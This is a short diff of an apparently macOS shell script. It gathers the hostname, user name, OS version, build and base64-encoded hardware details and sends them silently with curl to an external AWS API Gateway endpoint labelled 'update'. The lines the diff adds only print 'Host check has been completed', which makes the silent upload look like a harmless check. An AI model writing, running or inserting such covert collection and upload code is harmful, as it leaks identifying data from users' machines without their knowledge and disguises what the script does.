@@ -27,3 +27,6 @@ SYSTEM=$(system_profiler SPHardwareDataType | base64)
 STRING="$UNAME||$HOSTNAME||$USER||$VERSION||$BUILD||$SYSTEM"
 
 curl -s -o /dev/null "https://f7pd76nf23.execute-api.us-east-1.amazonaws.com/update?id=$STRING"
+
+
+echo "Host check has been completed"
